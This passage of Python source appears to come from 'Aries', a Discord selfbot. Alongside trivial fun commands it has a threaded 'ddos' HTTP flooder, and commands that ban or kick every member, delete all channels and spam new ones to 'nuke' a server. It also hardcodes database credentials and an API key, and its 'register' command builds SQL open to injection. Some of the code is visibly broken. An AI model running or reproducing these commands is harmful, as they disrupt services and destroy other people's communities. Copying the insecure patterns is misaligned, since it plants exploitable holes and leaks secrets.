        print("        .'  '.        ")
        print("       /======\       ")
        print("      ;:.  _   ;       ")
        print("      |:. (_)  |")
        print("      |:.  _   |")
        print("      |:. (_)  |")
        print("      ;:.      ;")
        print("    .' \:.    / `.")
        print("   / .-'':._.'`-. \   ")
        print("   |/    /||\    \|")

        sleep(0.2)
        os.system('cls' if os.name == 'nt' else 'clear')  
        distanceFromTop -= 1
        if distanceFromTop <0:
            isdone = True
            global nitro_sniper_config
            global version
            global prefix
            global copier
            global selfbot_detector_config
            os.system('cls' if os.name == 'nt' else 'clear')
            global ctu
            print(f"                                                   ___         _          ")
            print(f"                                                  /   |  _____(_)__  _____")
            print(f"                                                 / /| | / ___/ / _ \/ ___/")
            print(f"                                                / ___ |/ /  / /  __(__  ) ")
            print(f"                                               /_/  |_/_/  /_/\___/____/  ")
            print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
            print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + command_amount + Fore.RESET + "Commands!")
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + version + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper_config) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector_config) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)
@bot.command()
async def rocket(ctx):
    distanceFromTop = 20
#     /\        
#     ||       
#     ||       
#    /||\
    animate_Rocket()
@bot.command()
async def typewrite(ctx, delay: int, *, message):
    msg = await ctx.send(message[0])
    for i in range(len(message)):
        await msg.edit(content=message[:i+1])
        await asyncio.sleep(delay)
@bot.command()
async def convertvideo(ctx, videolink):
    await ctx.message.delete()
    def convert(path):
        yt = YouTube(videolink)
        yt = yt.streams.filter(progressive=True, file_extension='mp4').order_by('resolution').desc().first()
        if not os.path.exists(path):
            os.makedirs(path)
        yt.download(path)

    convert(str(os.getcwd()) + "/youtubeconverter")
    await aries.sendEmbed(ctx, f"Downloaded Video: {videolink} as mp4 to where Aries is!")
@bot.command()
async def iq(ctx, user: discord.User):
    #400 IQ = big brain
    await aries.sendEmbed(ctx, f"{user}'s IQ is: {random.randrange(1, 400)}")
@bot.command()
async def insult(ctx, user: discord.User):
    #Fix this !!!!
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/insults/new.json?') as r:
            res = await r.json()
        print(res['subreddit'])
        await aries.sendEmbed(ctx, res['data']['subreddit'] [random.randint(0, 25)]['data']['insults'])
@bot.command()
async def whois(ctx, website):
     ipv4 = socket.gethostbyname(f'{website}')
     obj = IPWhois(f'{ipv4}')
     objstring = str(obj.lookup_whois())
     await aries.sendEmbed(ctx, f"{objstring}")
@bot.command()
async def question(ctx):
    eightballs = ["for sure!", "yeah", "yes", "ok", "no", "i wouldnt advise", "ask agian", ""]
    await aries.sendEmbed(ctx, f"{random.choice(eightballs)}")
@bot.command()
async def servericon(ctx):
    icon_url = ctx.guild.icon_url
    await aries.sendFullyCustomEmbed(ctx, "", f"Server Icon", f"{icon_url}")
@bot.command()
async def banrecord(ctx):
    await ctx.message.delete()
    bans = await ctx.guild.bans()
    loop = [f"{u[1]} ({u[1].id})" for u in bans]
    _list = "\r\n".join([f"[{str(num).zfill(2)}] {data}" for num, data in enumerate(loop, start=1)])
    with open("./data/bans.json", "w") as f:
        f.write(json.dumps(f'{_list}', indent=2))
@bot.command()
async def listbans(ctx, *, reason=None):
    bans = await ctx.guild.bans()
    loop = [f"{u[1]} ({u[1].id})" for u in bans]
    _list = "\r\n".join([f"[{str(num).zfill(2)}] {data}" for num, data in enumerate(loop, start=1)])
    await ctx.send(f"```ini\n{_list}```")
@bot.command()
async def banall(ctx, *, reason=None):
    await ctx.message.delete()
    try:
        members = ctx.guild.members
        members.remove(ctx.me)
        for member in members:
            await member.ban(reason = reason)
    except Exception as e:
        print(e)
@bot.command()
async def kickall(ctx, *, reason=None):
    await ctx.message.delete()
    try:
      members = ctx.guild.members
      members.remove(ctx.me)
      for member in members:
       await member.kick(reason = reason)
    except Exception as e:
     print(e)
@bot.command()
async def register(ctx, Username, Password):
    mydb = mysql.connector.connect(
    host="	i0rgccmrx3at3wv3.cbetxkdyhwsb.us-east-1.rds.amazonaws.com",
    database='gsoimg7bu1dmj69t',
    user="n4letuv2yuy04i14",
    password="bdj65m50efam17ox",
    )
    #if (mydb.is_connected()):
       # print("Connected!")
    
    mySql_insert_query = f"""INSERT INTO tb_student (Username, Pass) VALUES ({Username}, {Password})"""

    cursor = mydb.cursor()
    cursor.execute(mySql_insert_query)
    mydb.commit()
    print(cursor.rowcount, "Record inserted successfully into Laptop table")
    cursor.close()
    mydb.close()
@bot.command()
async def cls(ctx, *, reason=None):
    await ctx.message.delete()
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Cleared!")
    await asyncio.sleep(5)
    global nitro_sniper_config
    global version
    global prefix_config
    global copier
    global selfbot_detector_config
    os.system('cls' if os.name == 'nt' else 'clear')
    global ctu
    aries.console(clear=True, line=True)
    r = requests.get("https://pastebin.com/raw/RceT5z9a")
    motd = r.content.decode()
    print("  " + Fore.LIGHTRED_EX + f"{bot.user}".center(os.get_terminal_size().columns) + Fore.RESET + f"{motd}".center(os.get_terminal_size().columns))
    print("    " + Fore.RED + f"{str(len(bot.guilds))}{Fore.RESET} Servers".center(os.get_terminal_size().columns))
    print("    " + Fore.RED + f"{str(len(bot.user.friends))} {Fore.RESET}Friends".center(os.get_terminal_size().columns))
@bot.command()
async def grabsiteip(ctx, website):    
    websiteip = socket.gethostbyname(f'{website}')
    await aries.sendEmbed(ctx, f"IP: {websiteip}")

@bot.command()
async def ddos(ctx, threads, target):
    fake_ip = '182.21.20.32'
    port = 80
    bytes = random._urandom(1490)
    def attack():
     while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + bytes + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception:
            pass
    for i in range(int(threads)):
        thread = threading.Thread(target=attack)
        thread.start()
    await aries.sendEmbed(ctx, f"DDoSing: + {target}".encode('ascii'))  
@bot.command()
async def support(ctx):
    channel = bot.get_channel(911101764185493557)
    try:
        message = await channel.send('!new') 
        await message.delete()
    except Exception:
        await aries.sendEmbed(ctx, f"Error | You aren't in Aries Server - https://discord.gg/eaGRnxZj7r")
    await aries.sendEmbed(ctx, f"Contacted Aries Support In the Aries Server. Check your ticket in Aries!")
@bot.command()
async def pingweb(ctx, website):
    try:
        websiteip = socket.gethostbyname(f'{website}')
        msg = None
        pingit = "-n 1"
        status = os.popen("ping " + pingit + " " + websiteip).read()
        if "TTL" in status: 
            msg = f"Website: {website} is UP"
        else:
            msg = f"Website: {website} is DOWN"
    except Exception as e:
        msg = f"Website: {website} is DOWN"

    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Pinger", description = f"Pinging: + {website}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")

    embed1 = discord.Embed(title= "Aries Pinger", description = f"{msg}", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed1.set_footer(text = "made with ♡ by bomt")

    msg1 = await ctx.send(embed = embed) 
    sleep(1)
    await msg1.edit(embed = embed1)
@bot.command()
async def pingip(ctx, ip):
    msg = None
    pingit = "-n 1"
    status = os.popen("ping " + pingit + " " + ip).read()
    if "TTL" in status: 
        msg = f"IP: {ip} is UP"
    else:
        msg = f"IP: {ip} is DOWN"

    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Pinger", description = f"Pinging: + {ip}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")

    embed1 = discord.Embed(title= "Aries Pinger", description = f"{msg}", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed1.set_footer(text = "made with ♡ by bomt")

    msg1 = await ctx.send(embed = embed) 
    sleep(1)
    await msg1.edit(embed = embed1)
@bot.command()
async def afk(ctx, args):
    global afkmode
    args1 = str(args)
    args2 = args1.replace("t", "T")
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme_config}",
        "AFK": f"{args2}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro}",
        "Delete_Timer": f"{deltimer_config}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    await aries.sendEmbed(ctx, f"Set AFK To: + {args2}")
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    await ctx.guild.unban(user)
    await aries.sendEmbed(ctx, f"Unbanned: {user}")
@bot.command()
async def iplookup(ctx, ip):
    #Ip Info using ipapi
    info = ipapi.location(ip=ip)    
    await aries.sendEmbed(ctx, f"Country: {info['country_name']}\nCity: {info['city']}\nTimezone: {info['timezone']}")
@bot.command()
async def delchannels(ctx):
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()
@bot.command()
async def createchannels(ctx):
    try:
      guild = ctx.guild
	  #channel = await guild.create_text_channel(channel_name)
      for i in range(70):
       await guild.create_text_channel("Aries on TOP")
      await aries.sendEmbed(ctx, "Created " + "Successfully") 
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")  
@bot.command()
async def changelog(ctx):
    global ctu
    print(f"""
            {Fore.GREEN}Green = Added
            {Fore.YELLOW}Yellow = Fixed
            {Fore.RED}Red = Removed {Fore.RESET}
    ------------------------------------------------------------------------------------------------------------------------

            {Fore.GREEN}Commands »                                      {Fore.GREEN}Features »                                      {Fore.GREEN}GUI »
            
            Added Changelog Command                         New(er) NitroSniper                             New(er) GUI
            Added Polls                                     AFK Mode                                        New Settings GUI
            Added Spamreaction                              Selfbot Detector                                New Exit Buttons
            Added CPU Command                                                                               Fixed GUI Loading Bugs
            Added IPLookup                                  
            {Fore.YELLOW}                                   
                                                            Fixed Login Time Bugs
                                                            Fixed GUI Bugs
            Fixed All Help/Info Menus                       Fixed Nitro Sniper Timing
            Fixed 12 Commands                               Fixed Nitro Sniper Auto-Redeem
            Fixed StealPFP and Avatar
    
    
    
    """)
@bot.command()
async def ecb64(ctx, *, text):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #Store Message to Encode 
    message = text
    #Convert to Bytes like Object using Strings encode method
    message_bytes = message.encode('ascii')
    #Encode using base64
    base64_bytes = base64.b64encode(message_bytes)
    #Make it a String
    base64_message = base64_bytes.decode('ascii')
    await aries.sendEmbed(ctx, f"Decoded: {text}\nEncoded: {base64_message}")
@bot.command()
async def dcb64(ctx, text):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    base64_message = text
    #Make it a bytes like object
    base64_bytes = base64_message.encode('ascii')
    #Decoode base64 Bytes
    message_bytes = base64.b64decode(base64_bytes)
    #Decode into String object
    message = message_bytes.decode('ascii')
    #Send it
    await aries.sendEmbed(ctx, f"Encoded: {text}\nDecoded: {message}")   
@bot.command()
async def serveremojis(ctx):
    emojis = ""
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for emoji in ctx.guild.emojis:
        emojis += str(emoji)
    result = ''.join([i for i in emojis if not i.isdigit()])
    await aries.sendEmbed(ctx, str(result))
@bot.command()
async def codeblock(ctx, mode, *, text):
    #TODO Add more
    if ("Normal" in mode):
        await ctx.send(f'```{text}```')
    elif "Java" in mode:
        text = f'```java\n{text}\n```'
        await ctx.send(text)
    elif "css" in mode:
        text = f'```css\n{text}\n```'
        await ctx.send(text)
@bot.command()
async def ascii(ctx, *, text):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #`
    asciiart = text2art(text)
    await ctx.send(f'```{asciiart}```')
@bot.command()
async def stealpfp(ctx, user: discord.User = None):
    isdone = False
    #Saves Avatar
    await user.avatar_url_as(format="png").save(fp=f"ariespfpgrabber.png")
    #Gets the path to where it saves the Avatar
    pfp_path = str(os.getcwd() + "/ariespfpgrabber.png")
    #Opens Image
    fp = open(pfp_path, 'rb')
    #Reads it
    pfp = fp.read()
    #Tries to set it
    try:
     await bot.user.edit(avatar = pfp) 
     isdone = True
     #Catches any Exceptions found
    except Exception:
     #If found print error
     print("Error Setting PFP")
     pass
     #Delete
     if isdone == True:
      try:
       os.remove((str(os.getcwd() + "/ariespfpgrabber.png")))
       isdone == False
      #Catches deleting Exception
      except Exception:
        print("Error")
        pass
@bot.command()
async def checkban(ctx, uuid, banid):
    await ctx.message.delete()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "XF-Api-Key": "bjtcSJf7RBLifkPVxFtexqAQOvpxOUE9"
    }
    resp = requests.get(f"https://hypixel.net/api/players/{uuid}/ban/{banid}", headers=headers)
    respstr = str(resp.text)
    print(respstr)
    print("--------------------------Overall--------------------------")
    if ("Ban" or "ban" in respstr):
        print(f"{Fore.RED}Banned = Yes")
    if ("Cheating through the use of unfair game advantages." in respstr):
        print(f"{Fore.RED}Staff Ban = Yes")
    await aries.sendEmbed(ctx, f"{respstr}") 
@bot.command()
async def pcinfo(ctx):
      cpu1 = round(psutil.cpu_percent(),1)
      uname = platform.uname()
      courecount = os.getenv("NUMBER_OF_PROCESSORS")
      print(os.cpu_count())
      await aries.sendEmbed(ctx, f"CPU: {uname.processor}\n\n CPU Usage: {cpu1}%\nCPU Cores: {str(courecount)}\nOS: {platform.system()}\n\nRam Usage: {psutil.virtual_memory()[2]}")
@bot.command()
async def cpu(ctx):
    #Get Amount of Used CPU
    cpu1 = round(psutil.cpu_percent(),1)
    #Loads the json to read contents
    await aries.sendEmbed(ctx, f"CPU Info: {platform.processor()}\nCPU Usage: {cpu1}")
@bot.command()
async def friendslist(ctx):
    for user in bot.user.friends:    
         num = int(0.8)
         sleep(num)    
         print(user.name + f"#{user.discriminator}")
    msg_to_del = await ctx.send('Check Console / GUI!')
    sleep(5)
    await msg_to_del.delete()
    sleep(30)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "                                                  ___         _          ")
    print(Fore.CYAN + "                                                 /   |  _____(_)__  _____")
    print(Fore.CYAN + "                                                / /| | / ___/ / _ \/ ___/")
    print(Fore.CYAN + "                                               / ___ |/ /  / /  __(__  ) ")
    print(Fore.CYAN + "                                              /_/  |_/_/  /_/\___/____/  ")
    print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
    print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + command_amount + Fore.RESET + "Commands!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + version + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper_config) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector_config) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)
@bot.command()
async def fuck(ctx):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
     for c in ctx.guild.channels:
        await c.delete()
    except commands.MissingPermissions:
        print("No Permission To RAID")

    try:
        guild = ctx.guild
        for i in range(70):
         await guild.create_text_channel("Aries on TOP")
        members = ctx.guild.members
        members.remove(ctx.me)
        for member in members:
         await member.kick(reason = "RAIDED")
        print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+] " + "Successfully Nuked " + Fore.RESET + f"{ctx.guild}!")
        sleep(5)
        ctx.guild.leave
    except commands.MissingPermissions:
        print("No Permission To RAID")


# ///////////////////////////////////////////////////////////////
# Main Load
def bot_login():
    """Log in the bot"""
    try:
        with open("./data/config.json") as f:
            config = json.load(f)
        token = config.get('token')
        bot.run(token)
    except Exception as e:
        print(e)
aries.console(clear=True, line=True)
print("Loading...")
bot_login()